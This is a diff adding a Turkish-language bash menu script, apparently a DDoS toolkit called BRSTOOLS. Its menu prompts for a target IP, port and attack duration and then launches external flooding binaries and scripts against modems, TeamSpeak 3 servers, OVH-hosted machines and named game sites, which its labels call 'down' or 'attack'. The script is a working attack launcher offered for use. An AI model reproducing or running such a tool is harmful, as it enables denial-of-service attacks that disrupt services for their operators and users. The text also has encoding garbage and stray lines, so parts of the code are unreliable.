@@ -1,0 +1,228 @@
+1#!/bin/bash
+BLACK='\e[0;30m'
+BLUE='\e[0;34m'
+GREEN='\e[0;32m'
+CYAN='\e[0;36m'
+RED='\e[0;31m'
+PURPLE='\e[0;35m'
+BROWN='\e[0;33m'
+LIGHTGRAY='\e[0;37m'
+DARKGRAY='\e[1;30m'
+LIGHTBLUE='\e[1;34m'
+LIGHTGREEN='\e[1;32m'
+LIGHTCYAN='\e[1;36m'
+LIGHTRED='\e[1;31m'
+LIGHTPURPLE='\e[1;35m'
+YELLOW='\e[1;33m'
+WHITE='\e[1;37m'
+NC='\e[0m'              # Renk Yok
+#
+#BRSTOOLS SCRï¿½PT BY Winchester
+#
+
+
+normal()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ï¿½ï¿½ï¿½                          Modem SALDIRI                           ï¿½ï¿½ï¿½ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+echo "Hedef :"
+read ip
+echo "Port :"
+read port
+perl ByWinchester.pl  $ip  $port 
+}
+
+guclu()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ï¿½ï¿½ï¿½                          Teamspeak SALDIRI                        ï¿½ï¿½ï¿½ "
+    echo "  ï¿½ï¿½ï¿½                          TS3 Sunuculari Icin Etkilidir.           ï¿½ï¿½ï¿½ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+echo "Hedef :"
+read ip
+echo "Port :"
+read port
+echo "Modem Ip'niz :"
+read modem
+echo "Saniye(Kac Saniye Saldiri Atilsin?) :"
+read saniye
+./WincOld -r $ip -p $port -z 0 -s $modem -t $saniye
+}
+
+bypass()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ï¿½ï¿½ï¿½                          OVH Serisi Icin                          ï¿½ï¿½ï¿½ "
+    echo "  ï¿½ï¿½ï¿½                                                                   ï¿½ï¿½ï¿½ "
+    echo "  +-----------------------------------------------------------------------+ "                                                                                                                 
+echo "Hedef :"
+read ip
+echo "Port :"
+read port
+echo "Saniye(Kac Saniye Saldiri Atilsin?) :"
+read saniye
+./brsovhv2 $ip $port 800 800 $saniye
+}
+
+remote()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ï¿½ï¿½ï¿½                          OVH Tek Atan V2                          ï¿½ï¿½ï¿½ "
+    echo "  ï¿½ï¿½ï¿½                                                                   ï¿½ï¿½ï¿½ "
+    echo "  +-----------------------------------------------------------------------+ "                                                                                                                  
+echo "Hedef :"
+read ip
+echo "Port :"
+read port
+echo "Saniye(Kac Saniye Saldiri Atilsin?) :"
+read saniye
+./brsovhWIN4 $ip $port 800 $saniye
+}
+ss
+
+amkote()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ï¿½ï¿½ï¿½                          OVH Tek Atan V3                          ï¿½ï¿½ï¿½ "
+    echo "  ï¿½ï¿½ï¿½                                                                   ï¿½ï¿½ï¿½ "
+    echo "  +-----------------------------------------------------------------------+ "                                                                                                                  
+echo "Hedef :"
+read ip
+echo "Port :"
+read port
+echo "Modem Ip'niz :"
+read modem
+echo "Saniye(Kac Saniye Saldiri Atilsin?) :"
+read saniye
+./88udp -r $ip -p $port -z 0 -s $modem -t $saniye
+}
+
+ssh()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ï¿½ï¿½ï¿½                    Csduragi Downed                               ï¿½ï¿½ï¿½ "
+    echo "  ï¿½ï¿½ï¿½                                                                  ï¿½ï¿½ï¿½ "
+    echo "  +-----------------------------------------------------------------------+ "                                                                                                                
+echo "Hedef :"
+read ip
+echo "Port :"
+read port
+echo "Saniye(Kac Saniye Saldiri Atilsin?) :"
+read saniye
+./WincOVH $ip $port 800 $saniye
+}
+
+sshv1()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ï¿½ï¿½ï¿½                    OyunYöneticisi Downed                         ï¿½ï¿½ï¿½ "
+    echo "  ï¿½ï¿½ï¿½                                                                  ï¿½ï¿½ï¿½ "
+    echo "  +-----------------------------------------------------------------------+ "                                                                                                                
+echo "Hedef :"
+read ip
+echo "Port :"
+read port
+echo "Saniye(Kac Saniye Saldiri Atilsin?) :"
+read saniye
+./brsovhv2 $ip $port 800 800 $saniye
+}
+
+tcpmss()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ï¿½ï¿½ï¿½                  OVH SITE SALDIRISI                               ï¿½ï¿½ï¿½ "
+    echo "  ï¿½ï¿½ï¿½                  HTTPS YERINE HTTP OLARAK GIRINIZ                 ï¿½ï¿½ï¿½ "
+    echo "  +-----------------------------------------------------------------------+ "                                                        
+echo "Hedef :"
+read url
+python ByWinchester.py $url
+}
+
+udpmss()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ï¿½ï¿½ï¿½                           HIZTESTI                                ï¿½ï¿½ï¿½ "
+    echo "  ï¿½ï¿½ï¿½                                                                   ï¿½ï¿½ï¿½ "
+    echo "  +-----------------------------------------------------------------------+ "                                                     
+python speedtest.py
+}
+
+tttmss()
+{
+    clear
+    echo -e " ${CYAN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ï¿½ï¿½ï¿½                           bilgiler                                ï¿½ï¿½ï¿½ "
+    echo "  ï¿½ï¿½ï¿½                                                                   ï¿½ï¿½ï¿½ "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+./bilgiler
+}
+
+Take_input1()
+{
+clear
+while :
+do
+clear
+
+    echo -e "${WHITE}Note: "${GREEN}CIKMAK ICIN ICIN [CTRL+C] BASIN
+    echo""
+	echo -e "${LIGHTBLUE}[1]${GREEN}[Modem Saldirisi]${LIGHTBLUE}"
+    echo -e "${LIGHTBLUE}[2]${GREEN}[Teamspea3 Normal Saldiri]${LIGHTBLUE}" 
+    echo -e "${LIGHTBLUE}[3]${GREEN}[OVH Tek Atan V1]${LIGHTBLUE}" 	
+    echo -e "${LIGHTBLUE}[4]${GREEN}[OVH Tek Atan V2]${LIGHTBLUE}"  
+    echo -e "${LIGHTBLUE}[5]${GREEN}[OVH Tek Atan V3]${LIGHTBLUE}"  	
+    echo -e "${LIGHTBLUE}[6]${GREEN}[Csduragi Downed]${LIGHTBLUE}" 
+    echo -e "${LIGHTBLUE}[7]${GREEN}[OyunYoneticisi Downed]${LIGHTBLUE}" 	
+    echo -e "${LIGHTBLUE}[8]${GREEN}[OVH Site Saldirisi]${LIGHTBLUE}"
+    echo -e "${LIGHTBLUE}[9]${GREEN}[HIZTESTI]${LIGHTBLUE}"	
+    echo -e "${LIGHTBLUE}[10]${GREEN}[bilgiler]${LIGHTBLUE}"
+    echo -n "ALEMDARAILESI- Bir Uygulama Secin [1-10]: "
+	
+    read yourch
+    case $yourch in
+      1) normal ;;
+      2) guclu ;;
+      3) bypass ;;
+      4) remote ;;
+      5) amkote ;;
+      6) ssh ;;
+      7) sshv1 ;;
+      8) tcpmss ;;
+      9) udpmss ;;
+      10) tttmss ;;
+      ex) echo "Yanlis Kod" ;  exit 1  ;;
+	  end) killall -9 Alemdarv2  ;;
+      *) echo "HATA" ;
+         echo "Press Enter. . ." ; read ;;
+ esac
+done # end_while
+}
+#
+# Set trap to for CTRL+C interrupt i.e. Install our error handler
+# When occurs it first it calls del_file() and then exit
+#
+trap exit_script 2
+#
+# Call our user define function : Take_input1
+#
+Take_input1
